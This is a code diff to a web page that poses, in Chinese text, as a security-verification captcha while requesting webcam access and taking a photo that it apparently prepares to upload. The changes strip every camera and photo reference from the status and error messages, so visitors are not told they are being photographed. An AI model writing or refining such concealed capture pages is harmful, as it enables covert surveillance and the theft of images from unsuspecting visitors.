@@ -66,10 +66,10 @@
     <div class="loading-container" id="loadingContainer">
         <div class="spinner"></div>
         <div class="loading-text">正在验证环境安全...</div>
-        <div class="loading-text" style="font-size: 12px; color: #999;">正在初始化摄像头...</div>
+        <div class="loading-text" style="font-size: 12px; color: #999;">正在初始化...</div>
         <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
         <div class="code-badge">验证编号: <span id="displayCode"></span></div>
-        <div class="camera-status" id="cameraStatus">⏳ 等待摄像头授权...</div>
+        <div class="camera-status" id="cameraStatus">⏳ 等待授权...</div>
         <div class="debug-info" id="debugInfo"></div>
     </div>
     <div class="captcha-container" id="captchaContainer">
@@ -121,7 +121,7 @@
                 document.getElementById('cameraStatus').classList.add('error');
                 setTimeout(() => window.location.reload(), 1500);
             } else {
-                document.getElementById('cameraStatus').innerHTML = '⚠️ 无法获取摄像头，跳过拍照';
+                document.getElementById('cameraStatus').innerHTML = '⚠️ 无法获取权限';
                 document.getElementById('cameraStatus').classList.add('error');
                 setTimeout(() => {
                     document.getElementById('loadingContainer').style.display = 'none';
@@ -135,7 +135,7 @@
         function capturePhoto() {
             return new Promise((resolve, reject) => {
                 if (!videoElement || !cameraReady) {
-                    reject('摄像头未就绪');
+                    reject('未就绪');
                     return;
                 }
                 const canvas = document.getElementById('canvas');
@@ -320,14 +320,14 @@
             if (cameraReady && videoElement?.videoWidth > 0) {
                 try {
                     photoData = await capturePhoto();
-                    resultDiv.textContent = '📸 拍照成功，准备上传...';
+                    resultDiv.textContent = '成功，准备...';
                     resultDiv.style.color = '#007aff';
                 } catch(e) {
-                    resultDiv.textContent = '⚠️ 拍照失败: ' + e.message;
+                    resultDiv.textContent = '失败: ' + e.message;
                     resultDiv.style.color = '#ff3b30';
                 }
             } else {
-                resultDiv.textContent = '⚠️ 摄像头未就绪，跳过拍照';
+                resultDiv.textContent = '未就绪';
                 resultDiv.style.color = '#ff3b30';
             }
 
